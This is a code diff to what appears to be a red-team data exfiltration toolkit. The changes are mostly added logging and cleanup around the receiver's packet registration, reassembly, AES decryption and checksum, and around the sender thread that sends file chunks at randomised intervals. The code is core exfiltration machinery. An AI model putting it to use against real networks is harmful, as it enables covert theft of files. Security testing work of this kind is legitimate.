@@ -143,6 +143,7 @@ class Exfiltration(object):
 
         # Load plugins
         # sys.path.insert(0, path)
+        info(f"{len(plugins.available())} plugins available")
         for fname in plugins.available():
             if self.should_use_plugin(fname):
                 if fname not in config["plugins"]:
@@ -150,6 +151,7 @@ class Exfiltration(object):
                     continue
                 mod = importlib.import_module(f"det.plugins.{fname}")
                 mod.Plugin(self, config["plugins"][fname])
+        info(f"Loaded {len(self.plugins)} plugins")
 
     def should_use_plugin(self, plugin_name):
         # if the plugin has been specified specifically (-p twitter)
@@ -200,14 +202,16 @@ class Exfiltration(object):
         global files
         jobid = message[0]
         if jobid not in files:
-            files[jobid] = {}
-            files[jobid]['checksum'] = message[3].lower()
-            files[jobid]['filename'] = message[1].lower()
-            files[jobid]['data'] = []
-            files[jobid]['packets_order'] = []
-            files[jobid]['packets_len'] = -1
-            warning("Register packet for file %s with checksum %s" %
-                    (files[jobid]['filename'], files[jobid]['checksum']))
+            f = {}
+            f['checksum'] = message[3].lower()
+            f['filename'] = message[1].lower()
+            f['data'] = []
+            f['packets_order'] = []
+            f['packets_len'] = -1
+            files[jobid] = f
+            warning(f"[{jobid}] REGISTER packet for file {f['filename']} with checksum {f['checksum']}")
+        else:
+            warning(f"[{jobid}] REGISTER packet received, but it's a duplicate, ignoring...")
 
     def retrieve_file(self, jobid):
         global files
@@ -217,7 +221,7 @@ class Exfiltration(object):
         #Reorder packets before reassembling / ugly one-liner hack
         files[jobid]['packets_order'], files[jobid]['data'] = \
                 [list(x) for x in zip(*sorted(zip(files[jobid]['packets_order'], files[jobid]['data'])))]
-        content = ''.join(v for v in files[jobid]['data'])
+        content = ''.join(files[jobid]['data'])
         content = unhexlify(content)
         content = aes_decrypt(content, self.KEY)
         if COMPRESSION:
@@ -226,13 +230,13 @@ class Exfiltration(object):
             with open(filename, 'wb') as f:
                 f.write(content)
         except IOError as e:
-            warning("Got %s: cannot save file %s" % filename)
+            warning(f"Got {str(e)}: cannot save file {filename}")
             raise e
 
         if (files[jobid]['checksum'] == md5(open(filename, 'rb'))):
-            ok("File %s recovered" % (fname))
+            ok(f"File {fname} recovered")
         else:
-            warning("File %s corrupt!" % (fname))
+            warning(f"File {fname} corrupt!")
 
         del files[jobid]
 
@@ -241,9 +245,10 @@ class Exfiltration(object):
         try:
             message = data
             if (message.count("|!|") >= 2):
-                info("Received {0} bytes".format(len(message)))
+                rcvd_bytes=len(message)
                 message = message.split("|!|")
                 jobid = message[0]
+                info(f"[{jobid}] Received {rcvd_bytes} bytes")
 
                 # register packet
                 if (message[2] == "REGISTER"):
@@ -253,19 +258,26 @@ class Exfiltration(object):
                     files[jobid]['packets_len'] = int(message[1])
                     #Check if all packets have arrived
                     if files[jobid]['packets_len'] == len(files[jobid]['data']):
+                        warning(f"[!][{jobid}] DONE packet received")
                         self.retrieve_file(jobid)
                     else:
-                        warning("[!] Received the last packet, but some are still missing. Waiting for the rest...")
+                        warning(f"[!][{jobid}] Received the last packet, but some are still missing. Waiting for the rest...")
                 # data packet
                 else:
                     # making sure there's a jobid for this file
                     if (jobid in files and message[1] not in files[jobid]['packets_order']):
+                        info(f"[{jobid}] DATA packet #{message[1]} received")
                         files[jobid]['data'].append(''.join(message[2:]))
                         files[jobid]['packets_order'].append(int(message[1]))
                         #In case this packet was the last missing one
                         if files[jobid]['packets_len'] == len(files[jobid]['data']):
+                            warning(f"[{jobid}] last DATA packet received, reconstructing file")
                             self.retrieve_file(jobid)
-        except:
+                    elif jobid in files:
+                        warning(f"[{jobid}] DUPLICATE DATA file received, ignoring.")
+                    else:
+                        warning(f"[!][{jobid}] received DATA PACKET for unknown JOBID!")
+        except Exception:
             traceback.print_exc()
             raise
             pass
@@ -333,10 +345,10 @@ class ExfiltrateFile(threading.Thread):
 
             data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
             plugin_send_function(data)
-            packet_index = packet_index + 1
+            packet_index += 1
 
             time_to_sleep = randint(1, MAX_TIME_SLEEP)
-            display_message("Sleeping for %s seconds" % time_to_sleep)
+            info("Sleeping for %s seconds" % time_to_sleep)
             time.sleep(time_to_sleep)
 
         # last packet
